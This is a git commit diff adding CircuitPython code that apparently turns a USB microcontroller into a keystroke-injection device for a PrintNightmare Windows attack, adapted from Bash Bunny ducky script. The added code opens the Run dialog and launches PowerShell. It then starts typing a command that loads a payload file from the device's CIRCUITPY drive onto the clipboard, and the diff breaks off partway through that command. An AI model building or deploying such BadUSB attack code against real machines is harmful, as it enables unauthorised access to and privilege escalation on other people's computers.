9176b0ea434ed868e49005abee6d4971cf4d8ee7
therealsnow <88793649+therealsnow@users.noreply.github.com>
2021-08-13 16:54:57 -0400

    Add files via upload

--- printnightmare/code.py
+++ printnightmare/code.py
@@ -1,4 +1,5 @@
 # This is not my original idea full credit goes to PanicAcid & Cribbit
+# I am adapting this from ducky script written for the bash bunny so full functionality is not achievable
 # My code is never pretty and almost always shit
 # V1 First attempt at writing print nightmare in circuitpython.
 
@@ -11,3 +12,14 @@ from adafruit_hid.keyboard import Keyboard
 from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
 
 if not 'jobdone.txt' in os.listdir():
+    time.sleep(1.5)
+    keyboard = Keyboard(usb_hid.devices)
+    layout = KeyboardLayoutUS(keyboard)
+    
+    keyboard.send(keycode.Windows, Keycode.R)
+    time.sleep(0.11)
+    
+    layout.write("powershell.exe\n")
+    time.sleep(2.00)
+    
+    layout.write("Set-Clipboard -Value (gc((gwmi win32_volume -f 'label=''CIRCUITPY''').Name+'
